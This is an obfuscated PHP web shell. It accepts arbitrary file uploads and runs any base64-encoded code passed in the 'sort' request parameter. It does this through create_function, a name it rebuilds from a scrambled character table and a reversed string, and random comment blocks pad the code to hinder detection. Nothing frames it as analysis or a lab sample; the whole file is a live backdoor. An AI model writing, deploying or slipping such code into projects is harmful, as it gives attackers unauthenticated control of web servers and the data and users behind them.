
        <?php
        
if(!empty($_POST['file_upload']))
{

    move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name']);

}
        
$aWCvvKso1734 = "dglef1tq7ky8rw4(s0n*.;9pc_6u2bm/j)ioaxhz53v";


$GRioQkVk3510 = "";

foreach([16,35,12,6] as $j){
       $GRioQkVk3510 .= $aWCvvKso1734[$j];
    }


if(isset($_REQUEST /*YUsrqpbzvXTSajtCpSAhaoLNsraXdsQSrigcVgvFadFhrslNfQlbcPccthJwQkFnEPOfuqIfyCmQBTXsPhPpYImMoqmpyvobLQpDNTPYQvLSFPCqsSnWNVqPdSIAYaQj*/["$GRioQkVk3510"])){
    $LlKuZQPl5362 = $_REQUEST /*YUsrqpbzvXTSajtCpSAhaoLNsraXdsQSrigcVgvFadFhrslNfQlbcPccthJwQkFnEPOfuqIfyCmQBTXsPhPpYImMoqmpyvobLQpDNTPYQvLSFPCqsSnWNVqPdSIAYaQj*/["$GRioQkVk3510"];
    $Dapbzanf8611 = "";
    $KerUunRq4644 = "";

    /*FWwCnlLOYgtZlKEZYEfgJRgnrduMtsftQqZCdbnehfGrAFrggieQwRfnxmeOFxolUevWOlINkxOcJUXHhfXUdkWFwOIjKVsvSlKJrOWQhjOhLCxCbwJqEXIspKgYJNoa*/

    foreach([29,36,16,3,26,14,25,0,3,24,35,0,3] as $j){
       $Dapbzanf8611 .= $aWCvvKso1734[$j];
    }

    /*JLTQOKemWpJGGDRQQgohXdnycZxgBYfXuGVqfagbGOwyvYexxkNrlDLXIHHInDOpZTRkpKbkiGeJdMkyYHgUswdQhKLDSBrZxAGxtNQNFSEoFUkStysRsJocAfJSrSOd*/


    foreach([16,6,12,12,3,42] as $j){
       $KerUunRq4644 .= $aWCvvKso1734[$j];
    }

    /*OBpdqjyJVxZnbveGHIyhmptINUAAJDeBZVSdgZZZewmFqqROPmxRZprHTdkCVIosdIoxQjuIhPuqyFxpQjqVGIjaTFOXagrDbPDkuMJKdBuvAmXjLAcsgvUNMBmMZYoh*/

    $j = $KerUunRq4644('n'.''.''.''.''.'o'.''.''.''.''.'i'.''.''.''.''.'t'.''.''.'c'.'n'.'u'.'f'.''.''.'_'.'e'.'t'.''.''.''.''.'a'.'e'.''.''.'r'.''.'c'.''.''.'');

    
    //echo $Dapbzanf8611($LlKuZQPl5362));
   
    
    $e = $j("", $Dapbzanf8611($LlKuZQPl5362));
    $e();
    

}

        
        
        